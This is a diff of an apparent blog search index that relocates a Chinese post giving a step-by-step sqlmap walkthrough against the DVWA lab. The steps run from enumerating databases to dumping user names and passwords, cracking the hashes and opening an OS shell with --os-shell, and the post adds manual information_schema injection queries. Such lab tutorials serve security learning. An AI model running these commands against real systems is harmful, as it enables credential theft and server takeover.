@@ -3003,6 +3210,35 @@ ITEM_PIPELINES = &#123;
 ]]></content>
   </entry>
   <entry>
+    <title>sqlmap</title>
+    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
+
+<p>第一步:</p>
+<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
+<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
+<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
+<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
+<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
+//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
+<p>第六步:</p>
+<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
+<p>group by *</p>
+<p>利用内置函数暴数据库信息</p>
+<p>version() 查看数据库版本</p>
+<p>database() 查看当前数据库名</p>
+<p>user() 查看当前用户</p>
+<p>查看表：</p>
+<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
+<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-11-21</title>
     <url>/2020/09/18/upload2/</url>
     <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><span id="more"></span>
@@ -3097,35 +3333,6 @@ ITEM_PIPELINES = &#123;
       <tags>
         <tag>双写绕过</tag>
         <tag>00截断</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlmap</title>
-    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
-
-<p>第一步:</p>
-<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
-<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
-<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
-<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
-<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
-//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
-<p>第六步:</p>
-<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
-<p>group by *</p>
-<p>利用内置函数暴数据库信息</p>
-<p>version() 查看数据库版本</p>
-<p>database() 查看当前数据库名</p>
-<p>user() 查看当前用户</p>
-<p>查看表：</p>
-<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
-<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
